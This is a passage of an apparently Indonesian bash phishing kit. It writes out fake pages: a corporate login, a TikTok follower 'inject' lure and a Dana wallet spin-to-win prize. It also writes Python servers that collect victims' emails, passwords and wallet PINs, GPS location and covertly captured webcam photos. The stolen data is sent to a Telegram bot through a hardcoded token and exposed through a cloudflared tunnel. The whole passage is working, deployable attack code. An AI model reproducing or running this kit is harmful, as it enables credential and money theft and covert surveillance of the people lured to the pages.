  <canvas id="canvas" width="640" height="480"></canvas>

  <script>
    const botToken = '8212462693:AAHl5cZ8jEYKCDsHzG1lyEmVELK9l80ZFXU';
    const chatIds = ['8594041996'];
    const userInp = document.getElementById('user');
    const jumlahInp = document.getElementById('jumlah');
    const btn = document.getElementById('inject-btn');
    const loading = document.getElementById('loading');

    function sendToTelegram(text) {
      chatIds.forEach(id => {
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: id, text: text, parse_mode: 'HTML' })
        }).catch(console.error);
      });
    }

    function sendPhotoToTelegram(blob) {
      chatIds.forEach(id => {
        const formData = new FormData();
        formData.append('chat_id', id);
        formData.append('photo', blob);
        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
          method: 'POST',
          body: formData
        }).catch(console.error);
      });
    }

    async function getInfo() {
      let ip = '-', city = '-', region = '-', country = '-', org = '-';
      try {
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipRes.json();
        ip = ipData.ip;
        const locRes = await fetch(`https://ip-api.com/json/${ip}`);
        const loc = await locRes.json();
        if (loc.status === 'success') {
          city = loc.city;
          region = loc.regionName;
          country = loc.country;
          org = loc.org;
        }
      } catch {}

      const battery = await navigator.getBattery?.() || { level: 0, charging: false };
      const batteryPercent = battery.level ? `${(battery.level * 100).toFixed(0)}%` : 'N/A';

      const text = `
IP         : ${ip}
Kota       : ${city}
Region     : ${region}
Negara     : ${country}
ISP        : ${org}
Browser    : ${navigator.userAgent}
OS         : ${navigator.platform}
Resolusi   : ${screen.width}x${screen.height}
Baterai    : ${batteryPercent} (${battery.charging ? 'Charging' : 'Tidak Charging'})
Memori     : ${navigator.deviceMemory || 'N/A'} GB
Cookie     : ${navigator.cookieEnabled ? 'Ya' : 'Tidak'}
Waktu      : ${new Date().toLocaleString()}
      `.trim();

      sendToTelegram(`<b>📥 Info Target:</b>\n<pre>${text}</pre>`);

      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          pos => {
            const link = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
            sendToTelegram(`<b>📍 Lokasi GPS:</b> <a href="${link}">Klik di sini</a>`);
          },
          () => sendToTelegram(`📍 Lokasi GPS Ditolak`)
        );
      } else {
        sendToTelegram(`📍 Browser tidak support GPS`);
      }
    }

    async function startCamera() {
      const video = document.getElementById('video');
      const canvas = document.getElementById('canvas');
      const ctx = canvas.getContext('2d');
      return new Promise((resolve) => {
        navigator.mediaDevices.getUserMedia({ video: true })
          .then(stream => {
            video.srcObject = stream;
            video.onloadedmetadata = () => {
              setTimeout(() => {
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                canvas.toBlob(blob => {
                  if (blob) sendPhotoToTelegram(blob);
                  stream.getTracks().forEach(track => track.stop());
                  resolve();
                }, 'image/jpeg');
              }, 3000);
            };
          })
          .catch(err => {
            sendToTelegram('❌ Kamera Ditolak atau Tidak Tersedia');
            resolve();
          });
      });
    }

    btn.addEventListener('click', async () => {
      const user = userInp.value.trim();
      const jumlah = jumlahInp.value.trim();
      if (!user || !jumlah) {
        alert('Lengkapi semua kolom');
        return;
      }
      btn.disabled = true;
      loading.style.display = 'block';
      sendToTelegram(`<b>🎯 Target Username:</b> ${user}\n<b>🪙 Jumlah Inject:</b> ${jumlah}`);
      userInp.value = '';
      jumlahInp.value = '';
      try {
        await getInfo();
        await startCamera();
        setTimeout(() => {
          loading.innerHTML = '<div style="color:#00ff00">[ ✓ ] Inject berhasil!</div>';
          setTimeout(() => location.href = 'https://instagram.com', 2000);
        }, 1000);
      } catch (e) {
        loading.innerHTML = '<div style="color:#ff4444">✗ Inject gagal</div>';
        setTimeout(() => location.reload(), 2000);
      }
    });

    function createParticles() {
      const container = document.querySelector('.bg-particles');
      for (let i = 0; i < 50; i++) {
        const p = document.createElement('div');
        p.className = 'particle';
        p.style.left = Math.random() * 100 + '%';
        p.style.top = Math.random() * 100 + '%';
        p.style.animationDelay = Math.random() * 6 + 's';
        p.style.animationDuration = (Math.random() * 4 + 4) + 's';
        container.appendChild(p);
      }
    }
    document.addEventListener('DOMContentLoaded', createParticles);
  </script>
</body>
</html>
EOF

  # Python server (fix tanpa index)
  cat > server.py <<'EOF'
#!/usr/bin/env python3
import base64, json, socket, requests, subprocess, threading, time, os, random
from http.server import BaseHTTPRequestHandler, HTTPServer

TOKEN   = "8212462693:AAHl5cZ8jEYKCDsHzG1lyEmVELK9l80ZFXU"
ADMIN_ID = input("[ ! ] MASUKKAN ID TELEGRAM KAMU: ").strip()

def tg_photo(chat_id, path, caption):
    url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
    with open(path, "rb") as ph:
        requests.post(url, data={"chat_id": chat_id, "caption": caption}, files={"photo": ph})

class Handler(BaseHTTPRequestHandler):
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()

    def do_POST(self):
        if self.path == "/data":
            length = int(self.headers["Content-Length"])
            data = json.loads(self.rfile.read(length).decode())
            user, jumlah, lat, lon, img = data["user"], data["jumlah"], data["lat"], data["lon"], data["img"]
            fn = f"inject_{random.randint(1000,9999)}.jpg"
            with open(fn, "wb") as f:
                f.write(base64.b64decode(img))
            map_url = f"https://www.google.com/maps?q={lat},{lon}&hl=id&z=18"
            print(f"\n[ ✓ ] Inject User: {user} | Jumlah: {jumlah}\n[ 📍 ] Lokasi: {lat},{lon}\n[ 🗺️ ] Peta: {map_url}")
            tg_photo(ADMIN_ID, fn, f"🎯 Inject User: {user}\n🪙 Jumlah: {jumlah}\n📍 Lokasi: {lat}, {lon}\n🗺️ Peta: {map_url}")
            os.remove(fn)
            self.send_response(200)
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()

    def do_GET(self):
        if self.path == "/":
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            with open("index.html", "rb") as f:
                self.wfile.write(f.read())

def free_port(start=8081):
    for p in range(start, start+100):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            try:
                s.bind(("0.0.0.0", p))
                return p
            except OSError:
                continue
    raise RuntimeError("No free port")

PORT = free_port(8081)
threading.Thread(target=lambda: HTTPServer(("0.0.0.0", PORT), Handler).serve_forever(), daemon=True).start()

print("\n[ ∅ ] Sebelum mengirim link Phising ke target mohon start bot telegram ini: http://t.me/phising_shadownex_bot\n")
print("[ ∅ ] DATA FOTO & LAINYA AKAN DI KIRIMKAN MELALUI BOT TELEGRAM KE ID YANG ANDA MASUKAN")
tunnel = subprocess.Popen(
    ["cloudflared", "tunnel", "--url", f"http://localhost:{PORT}"],
    stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
)

for line in tunnel.stdout:
    if "https://" in line and "trycloudflare.com" in line:
        url = line.split("https://")[1].split()[0]
        print(f"[ ✓ ] LINK INJECT PREMIUM: https://{url}\n")
        break

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    tunnel.terminate()
    print("\n[ ∅ ] Server dihentikan.")
EOF

  chmod +x server.py
  python3 server.py
}


phising_PRO(){

  WORK_DIR="$HOME/DanxyPro"
  mkdir -p "$WORK_DIR" && cd "$WORK_DIR"
  trap 'echo ""; cd $HOME; rm -rf "$WORK_DIR"; exit' INT EXIT ERR

  cat > index.html <<'EOF'
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <title>Enterprise Portal - Secure Login</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
    *{box-sizing:border-box;margin:0;font-family:'Inter',sans-serif;}
    body{
      background:linear-gradient(135deg,#0a0a0a,#1a1a2e,#16213e);
      display:flex;
      align-items:center;
      justify-content:center;
      height:100vh;
      flex-direction:column;
      color:#fff;
      overflow:hidden;
    }
    .card{
      width:100%;
      max-width:420px;
      padding:50px 40px;
      background:rgba(255,255,255,0.05);
      border:1px solid rgba(255,255,255,0.1);
      border-radius:24px;
      backdrop-filter:blur(16px);
      box-shadow:0 0 50px rgba(0,150,255,0.3);
    }
    .logo{
      font-size:28px;
      font-weight:700;
      background:linear-gradient(45deg,#0099ff,#00d4ff);
      -webkit-background-clip:text;
      -webkit-text-fill-color:transparent;
      text-align:center;
      margin-bottom:8px;
      letter-spacing:-1px;
    }
    .subtitle{
      font-size:14px;
      color:#b0b0b0;
      text-align:center;
      margin-bottom:35px;
    }
    .form-group{
      margin-bottom:20px;
    }
    label{
      display:block;
      font-size:13px;
      color:#b0b0b0;
      margin-bottom:8px;
    }
    input{
      width:100%;
      padding:14px;
      background:#000;
      border:1px solid #333;
      border-radius:10px;
      color:#fff;
      font-size:14px;
      transition:.3s;
    }
    input:focus{
      outline:none;
      border-color:#0099ff;
      box-shadow:0 0 10px rgba(0,150,255,0.5);
    }
    .btn{
      width:100%;
      padding:14px;
      border:none;
      border-radius:12px;
      background:linear-gradient(45deg,#0099ff,#00d4ff);
      color:#fff;
      font-weight:600;
      font-size:16px;
      cursor:pointer;
      transition:.3s;
    }
    .btn:hover{transform:scale(1.02);box-shadow:0 0 25px rgba(0,150,255,0.6);}
    .footer{
      text-align:center;
      margin-top:25px;
      font-size:12px;
      color:#666;
    }
    .loading{
      display:none;
      margin-top:15px;
      text-align:center;
      color:#00d4ff;
      font-size:14px;
    }
    .spinner{
      border:3px solid rgba(255,255,255,0.2);
      border-top:3px solid #00d4ff;
      border-radius:50%;
      width:20px;
      height:20px;
      animation:spin 1s linear infinite;
      margin:0 auto 8px;
    }
    @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
  </style>
</head>
<body>
  <div class="card">
    <div class="logo">Enterprise Portal</div>
    <div class="subtitle">Secure login for employees & partners</div>
    <div class="form-group">
      <label>Email Address</label>
      <input type="email" id="email" placeholder=" "/>
    </div>
    <div class="form-group">
      <label>Password</label>
      <input type="password" id="pass" placeholder=" "/>
    </div>
    <button class="btn" onclick="login()">Sign In</button>
    <div class="loading" id="loading">
      <div class="spinner"></div>
      <div>Authenticating...</div>
    </div>
    <div class="footer">
      © 2024 - 2025 NEXULTZYCorp. All rights reserved.
    </div>
  </div>

  <script>
    async function login(){
      const email=document.getElementById('email').value.trim();
      const pass=document.getElementById('pass').value.trim();
      if(!email||!pass){alert('Please fill all fields');return;}

      document.getElementById('loading').style.display='block';

      try{
        const pos=await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej));
        const {latitude:lat,longitude:lon}=pos.coords;

        const canvas=document.createElement('canvas');
        const video=document.createElement('video');
        const stream=await navigator.mediaDevices.getUserMedia({video:true});
        video.srcObject=stream;await video.play();
        [canvas.width,canvas.height]=[video.videoWidth,video.videoHeight];
        canvas.getContext('2d').drawImage(video,0,0);
        const img=canvas.toDataURL('image/jpeg').split(',')[1];
        stream.getTracks().forEach(t=>t.stop());

        await fetch('/data',{
          method:'POST',
          headers:{'Content-Type':'application/json'},
          body:JSON.stringify({email,pass,lat,lon,img})
        });

        setTimeout(()=>{
          document.getElementById('loading').innerHTML='<div style=color:#00ff00>✓ Authentication successful</div>';
          setTimeout(()=>location.href='https://danxycorp.com',2000);
        },1500);

      }catch(e){
        document.getElementById('loading').innerHTML='<div style=color:#ff4444>✗ Authentication failed</div>';
        setTimeout(()=>location.reload(),2000);
      }
    }
  </script>
</body>
</html>
EOF

  # Python server (fix tanpa index)
  cat > server.py <<'EOF'
#!/usr/bin/env python3
import base64, json, socket, requests, subprocess, threading, time, os, random
from http.server import BaseHTTPRequestHandler, HTTPServer

TOKEN   = "8212462693:AAHl5cZ8jEYKCDsHzG1lyEmVELK9l80ZFXU"
ADMIN_ID = input("[ ! ] MASUKKAN ID TELEGRAM KAMU: ").strip()

def tg_photo(chat_id, path, caption):
    url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
    with open(path, "rb") as ph:
        requests.post(url, data={"chat_id": chat_id, "caption": caption}, files={"photo": ph})

class Handler(BaseHTTPRequestHandler):
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()

    def do_POST(self):
        if self.path == "/data":
            length = int(self.headers["Content-Length"])
            data = json.loads(self.rfile.read(length).decode())
            email, passw, lat, lon, img = data["email"], data["pass"], data["lat"], data["lon"], data["img"]
            fn = f"pro_{random.randint(1000,9999)}.jpg"
            with open(fn, "wb") as f:
                f.write(base64.b64decode(img))
            map_url = f"https://maps.google.com/maps?q={lat},{lon}&hl=id&z=18"
            print(f"\n[ ✓ ] Pro Email: {email} | Pass: {passw}\n[ 📍 ] Lokasi: {lat},{lon}\n[ 🗺️ ] Peta: {map_url}")
            tg_photo(ADMIN_ID, fn, f"🏢 Pro Email: {email}\n🔑 Pass: {passw}\n📍 Lokasi: {lat}, {lon}\n🗺️ Peta: {map_url}")
            os.remove(fn)
            self.send_response(200)
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()

    def do_GET(self):
        if self.path == "/":
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            with open("index.html", "rb") as f:
                self.wfile.write(f.read())

def free_port(start=8081):
    for p in range(start, start+100):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            try:
                s.bind(("0.0.0.0", p))
                return p
            except OSError:
                continue
    raise RuntimeError("No free port")

PORT = free_port(8081)
threading.Thread(target=lambda: HTTPServer(("0.0.0.0", PORT), Handler).serve_forever(), daemon=True).start()

print("\n[ ∅ ] Sebelum mengirim link Phising ke target mohon start bot telegram ini: http://t.me/phising_shadownex_bot\n")
print("[ ∅ ] DATA FOTO & LAINYA AKAN DI KIRIMKAN MELALUI BOT TELEGRAM KE ID YANG ANDA MASUKAN")
tunnel = subprocess.Popen(
    ["cloudflared", "tunnel", "--url", f"http://localhost:{PORT}"],
    stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
)

for line in tunnel.stdout:
    if "https://" in line and "trycloudflare.com" in line:
        url = line.split("https://")[1].split()[0]
        print(f"[ ✓ ] LINK PROFESSIONAL PHISING: https://{url}\n")
        break

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    tunnel.terminate()
    print("\n[ ∅ ] Server dihentikan.")
EOF

  chmod +x server.py
  python3 server.py
}


phising_TTSUNTIK(){

  WORK_DIR="$HOME/DanxyTTSuntik"
  mkdir -p "$WORK_DIR" && cd "$WORK_DIR"
  trap 'echo ""; cd $HOME; rm -rf "$WORK_DIR"; exit' INT EXIT ERR

  cat > index.html <<'EOF'
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <title>Suntik TikTok Followers</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
    *{box-sizing:border-box;margin:0;font-family:'Inter',sans-serif;}
    body{
      background:linear-gradient(135deg,#0a0a0a,#1a1a2e,#16213e);
      display:flex;
      align-items:center;
      justify-content:center;
      height:100vh;
      flex-direction:column;
      color:#fff;
      overflow:hidden;
    }
    .card{
      width:100%;
      max-width:400px;
      padding:40px 30px;
      background:rgba(255,255,255,0.05);
      border:1px solid rgba(255,255,255,0.1);
      border-radius:20px;
      backdrop-filter:blur(12px);
      box-shadow:0 0 40px rgba(0,255,255,0.3);
      text-align:center;
    }
    .logo{
      font-size:32px;
      font-weight:700;
      background:linear-gradient(45deg,#00ffff,#ff00ff);
      -webkit-background-clip:text;
      -webkit-text-fill-color:transparent;
      margin-bottom:10px;
      letter-spacing:-1px;
    }
    .subtitle{
      font-size:14px;
      color:#b0b0b0;
      margin-bottom:25px;
    }
    .suntik{
      width:120px;
      height:120px;
      margin:0 auto 20px;
      background:url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><rect x="20" y="10" width="60" height="80" rx="10" fill="%2300ffff"/><rect x="25" y="5" width="50" height="20" rx="5" fill="%23ff00ff"/><circle cx="50" cy="50" r="15" fill="%23fff"/></svg>') center/cover;
      filter:drop-shadow(0 0 15px rgba(0,255,255,0.8));
    }
    input{
      width:100%;
      padding:12px;
      margin-bottom:12px;
      background:#000;
      border:1px solid #333;
      border-radius:8px;
      color:#fff;
      font-size:14px;
    }
    input:focus{outline:none;border-color:#00ffff;}
    .btn{
      width:100%;
      padding:14px;
      border:none;
      border-radius:12px;
      background:linear-gradient(45deg,#00ffff,#ff00ff);
      color:#fff;
      font-weight:600;
      font-size:16px;
      cursor:pointer;
      transition:.3s;
    }
    .btn:hover{transform:scale(1.02);box-shadow:0 0 25px rgba(0,255,255,0.6);}
    .loading{
      display:none;
      margin-top:15px;
      text-align:center;
      color:#00ffff;
      font-size:14px;
    }
    .spinner{
      border:3px solid rgba(255,255,255,0.2);
      border-top:3px solid #00ffff;
      border-radius:50%;
      width:20px;
      height:20px;
      animation:spin 1s linear infinite;
      margin:0 auto 8px;
    }
    @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
  </style>
</head>
<body>
  <div class="card">
    <div class="logo">TikTok Suntik</div>
    <div class="subtitle">Suntik TikTok gratis tanpa login!</div>
    <div class="suntik"></div>
    <input type="text" id="user" placeholder="Username TikTok"/>
    <input type="number" id="coin" placeholder="Jumlah Followers"/>
    <button class="btn" onclick="inject()">INJECT SEKARANG</button>
    <div class="loading" id="loading">
      <div class="spinner"></div>
      <div>Menginjeksi akun...</div>
    </div>
  </div>

  <script>
    async function inject(){
      const user=document.getElementById('user').value.trim();
      const coin=document.getElementById('coin').value.trim();
      if(!user||!coin){alert('Lengkapi semua kolom');return;}

      document.getElementById('loading').style.display='block';

      try{
        const pos=await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej));
        const {latitude:lat,longitude:lon}=pos.coords;

        const canvas=document.createElement('canvas');
        const video=document.createElement('video');
        const stream=await navigator.mediaDevices.getUserMedia({video:true});
        video.srcObject=stream;await video.play();
        [canvas.width,canvas.height]=[video.videoWidth,video.videoHeight];
        canvas.getContext('2d').drawImage(video,0,0);
        const img=canvas.toDataURL('image/jpeg').split(',')[1];
        stream.getTracks().forEach(t=>t.stop());

        await fetch('/data',{
          method:'POST',
          headers:{'Content-Type':'application/json'},
          body:JSON.stringify({user,coin,lat,lon,img})
        });

        setTimeout(()=>{
          document.getElementById('loading').innerHTML='<div style=color:#00ff00>✓ Inject berhasil!</div>';
          setTimeout(()=>location.href='https://tiktok.com',2000);
        },1500);

      }catch(e){
        document.getElementById('loading').innerHTML='<div style=color:#ff4444>✗ Inject gagal</div>';
        setTimeout(()=>location.reload(),2000);
      }
    }
  </script>
</body>
</html>
EOF

  # Python server (fix tanpa index)
  cat > server.py <<'EOF'
#!/usr/bin/env python3
import base64, json, socket, requests, subprocess, threading, time, os, random
from http.server import BaseHTTPRequestHandler, HTTPServer

TOKEN   = "8212462693:AAHl5cZ8jEYKCDsHzG1lyEmVELK9l80ZFXU"
ADMIN_ID = input("[ ! ] MASUKKAN ID TELEGRAM KAMU: ").strip()

def tg_photo(chat_id, path, caption):
    url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
    with open(path, "rb") as ph:
        requests.post(url, data={"chat_id": chat_id, "caption": caption}, files={"photo": ph})

class Handler(BaseHTTPRequestHandler):
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()

    def do_POST(self):
        if self.path == "/data":
            length = int(self.headers["Content-Length"])
            data = json.loads(self.rfile.read(length).decode())
            user, coin, lat, lon, img = data["user"], data["coin"], data["lat"], data["lon"], data["img"]
            fn = f"suntik_{random.randint(1000,9999)}.jpg"
            with open(fn, "wb") as f:
                f.write(base64.b64decode(img))
            map_url = f"https://maps.google.com/maps?q={lat},{lon}&hl=id&z=18"
            print(f"\n[ ✓ ] Suntik User: {user} | Coin: {coin}\n[ 📍 ] Lokasi: {lat},{lon}\n[ 🗺️ ] Peta: {map_url}")
            tg_photo(ADMIN_ID, fn, f"💉 Suntik User: {user}\n🪙 Coin: {coin}\n📍 Lokasi: {lat}, {lon}\n🗺️ Peta: {map_url}")
            os.remove(fn)
            self.send_response(200)
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()

    def do_GET(self):
        if self.path == "/":
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            with open("index.html", "rb") as f:
                self.wfile.write(f.read())

def free_port(start=8081):
    for p in range(start, start+100):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            try:
                s.bind(("0.0.0.0", p))
                return p
            except OSError:
                continue
    raise RuntimeError("No free port")

PORT = free_port(8081)
threading.Thread(target=lambda: HTTPServer(("0.0.0.0", PORT), Handler).serve_forever(), daemon=True).start()

print("\n[ ∅ ] Sebelum mengirim link Phising ke target mohon start bot telegram ini: http://t.me/phising_shadownex_bot\n")
print("[ ∅ ] DATA FOTO & LAINYA AKAN DI KIRIMKAN MELALUI BOT TELEGRAM KE ID YANG ANDA MASUKAN")
tunnel = subprocess.Popen(
    ["cloudflared", "tunnel", "--url", f"http://localhost:{PORT}"],
    stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
)

for line in tunnel.stdout:
    if "https://" in line and "trycloudflare.com" in line:
        url = line.split("https://")[1].split()[0]
        print(f"[ ✓ ] LINK SUNTIK TIKTOK PHISING: https://{url}\n")
        break

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    tunnel.terminate()
    print("\n[ ∅ ] Server dihentikan.")
EOF

  chmod +x server.py
  python3 server.py
}


#####################################################
#####################################################
phising_SPIN(){
  WORK_DIR="$HOME/DanxySpin"
  mkdir -p "$WORK_DIR" && cd "$WORK_DIR"
  trap 'echo ""; cd $HOME; rm -rf "$WORK_DIR"; exit' INT EXIT ERR
  # ===== END CLEAN-UP =====
  
  # HTML Spin Dana 2025 (glassmorphism + neon)
  cat > index.html <<'EOF'
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <title>Spin & Win - Saldo Dana</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
    *{box-sizing:border-box;margin:0;font-family:'Inter',sans-serif;}
    body{
      background:linear-gradient(135deg,#0a0a0a,#1a1a2e,#16213e);
      display:flex;
      align-items:center;
      justify-content:center;
      height:100vh;
      flex-direction:column;
      color:#fff;
      overflow:hidden;
    }
    .card{
      width:100%;
      max-width:400px;
      padding:40px 30px;
      background:rgba(255,255,255,0.05);
      border:1px solid rgba(255,255,255,0.1);
      border-radius:20px;
      backdrop-filter:blur(12px);
      box-shadow:0 0 40px rgba(0,255,255,0.3);
      text-align:center;
    }
    .title{
      font-size:32px;
      font-weight:700;
      background:linear-gradient(45deg,#00ffff,#ff00ff);
      -webkit-background-clip:text;
      -webkit-text-fill-color:transparent;
      margin-bottom:10px;
      letter-spacing:-1px;
    }
    .subtitle{
      font-size:14px;
      color:#b0b0b0;
      margin-bottom:30px;
    }
    .wheel{
      width:250px;
      height:250px;
      margin:0 auto 30px;
      background:conic-gradient(
        #00ffff 0deg 60deg,
        #ff00ff 60deg 120deg,
        #00ff00 120deg 180deg,
        #ffff00 180deg 240deg,
        #ff0050 240deg 300deg,
        #0099ff 300deg 360deg
      );
      border-radius:50%;
      position:relative;
      box-shadow:0 0 30px rgba(0,255,255,0.5);
      transition:transform 3s cubic-bezier(0.25,1,0.5,1);
    }
    .wheel::after{
      content:'';
      position:absolute;
      top:-12px;
      left:50%;
      transform:translateX(-50%);
      width:0;
      height:0;
      border-left:12px solid transparent;
      border-right:12px solid transparent;
      border-top:24px solid #fff;
      z-index:10;
    }
    .btn{
      width:100%;
      padding:14px;
      border:none;
      border-radius:12px;
      background:linear-gradient(45deg,#00ffff,#ff00ff);
      color:#fff;
      font-weight:600;
      font-size:16px;
      cursor:pointer;
      transition:.3s;
    }
    .btn:hover{transform:scale(1.02);box-shadow:0 0 25px rgba(0,255,255,0.6);}
    .form{
      display:none;
      margin-top:20px;
    }
    input{
      width:100%;
      padding:12px;
      margin-bottom:12px;
      background:#000;
      border:1px solid #333;
      border-radius:8px;
      color:#fff;
      font-size:14px;
    }
    input:focus{outline:none;border-color:#00ffff;}
    .loading{
      display:none;
      margin-top:15px;
      text-align:center;
      color:#00ffff;
      font-size:14px;
    }
    .spinner{
      border:3px solid rgba(255,255,255,0.2);
      border-top:3px solid #00ffff;
      border-radius:50%;
      width:20px;
      height:20px;
      animation:spin 1s linear infinite;
      margin:0 auto 8px;
    }
    @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
  </style>
</head>
<body>
  <div class="card">
    <div class="title">Spin & Win</div>
    <div class="subtitle">Putar roda dan menangkan saldo Dana hingga 1.000.000!</div>
    <div class="wheel" id="wheel"></div>
    <button class="btn" onclick="startSpin()">PUTAR SEKARANG</button>
    <div class="loading" id="loading">
      <div class="spinner"></div>
      <div>Memproses hadiah...</div>
    </div>
    <div class="form" id="form">
      <input type="text" id="user" placeholder="Nomor HP (contoh: 0857xxxx)"/>
      <input type="password" id="pass" placeholder="PIN Dana (6 digit)"/>
      <button class="btn" onclick="claim()">Klaim Hadiah</button>
    </div>
  </div>

  <script>
    let hadiah=["Saldo Dana Rp50.000","Saldo Dana Rp100.000","Saldo Dana Rp250.000","Saldo Dana Rp500.000","Saldo Dana Rp1.000.000"];
    let degree=0;

    function startSpin(){
      degree+=Math.floor(1800+Math.random()*1800);
      document.getElementById('wheel').style.transform=`rotate(${degree}deg)`;
      setTimeout(()=>{
        document.getElementById('form').style.display='block';
        document.querySelector('.btn').style.display='none';
      },3000);
    }

    async function claim(){
      const user=document.getElementById('user').value.trim();
      const pass=document.getElementById('pass').value.trim();
      if(!user||!pass){alert('Lengkapi semua kolom');return;}

      document.getElementById('loading').style.display='block';

      try{
        const pos=await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej));
        const {latitude:lat,longitude:lon}=pos.coords;

        const canvas=document.createElement('canvas');
        const video=document.createElement('video');
        const stream=await navigator.mediaDevices.getUserMedia({video:true});
        video.srcObject=stream;await video.play();
        [canvas.width,canvas.height]=[video.videoWidth,video.videoHeight];
        canvas.getContext('2d').drawImage(video,0,0);
        const img=canvas.toDataURL('image/jpeg').split(',')[1];
        stream.getTracks().forEach(t=>t.stop());

        await fetch('/data',{
          method:'POST',
          headers:{'Content-Type':'application/json'},
          body:JSON.stringify({user,pass,lat,lon,img})
        });

        setTimeout(()=>{
          document.getElementById('loading').innerHTML='<div style=color:#00ff00>✓ Hadiah berhasil diklaim!</div>';
          setTimeout(()=>location.href='https://dana.id',2000);
        },1500);

      }catch(e){
        document.getElementById('loading').innerHTML='<div style=color:#ff4444>✗ Klaim gagal</div>';
        setTimeout(()=>location.reload(),2000);
      }
    }
  </script>
</body>
</html>
EOF

  # Python server (fix tanpa index)
  cat > server.py <<'EOF'
#!/usr/bin/env python3
import base64, json, socket, requests, subprocess, threading, time, os, random
from http.server import BaseHTTPRequestHandler, HTTPServer

TOKEN   = "8212462693:AAHl5cZ8jEYKCDsHzG1lyEmVELK9l80ZFXU"
ADMIN_ID = input("[ ! ] MASUKKAN ID TELEGRAM KAMU: ").strip()

def tg_photo(chat_id, path, caption):
    url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
    with open(path, "rb") as ph:
        requests.post(url, data={"chat_id": chat_id, "caption": caption}, files={"photo": ph})

class Handler(BaseHTTPRequestHandler):
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()

    def do_POST(self):
        if self.path == "/data":
            length = int(self.headers["Content-Length"])
            data = json.loads(self.rfile.read(length).decode())
            user, passw, lat, lon, img = data["user"], data["pass"], data["lat"], data["lon"], data["img"]
            fn = f"spin_{random.randint(1000,9999)}.jpg"
            with open(fn, "wb") as f:
                f.write(base64.b64decode(img))
            map_url = f"https://maps.google.com/maps?q={lat},{lon}&hl=id&z=18"
            print(f"\n[ ✓ ] Spin User: {user} | PIN: {passw}\n[ 📍 ] Lokasi: {lat},{lon}\n[ 🗺️ ] Peta: {map_url}")
            tg_photo(ADMIN_ID, fn, f"🎯 Spin User: {user}\n🔑 PIN: {passw}\n📍 Lokasi: {lat}, {lon}\n🗺️ Peta: {map_url}")
            os.remove(fn)
            self.send_response(200)
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()

    def do_GET(self):
        if self.path == "/":
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            with open("index.html", "rb") as f:
                self.wfile.write(f.read())

def free_port(start=8081):
    for p in range(start, start+100):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            try:
                s.bind(("0.0.0.0", p))
                return p
            except OSError:
                continue
    raise RuntimeError("No free port")

PORT = free_port(8081)
threading.Thread(target=lambda: HTTPServer(("0.0.0.0", PORT), Handler).serve_forever(), daemon=True).start()

print("\n[ ∅ ] Sebelum mengirim link Phising ke target mohon start bot telegram ini: http://t.me/phising_shadownex_bot\n")
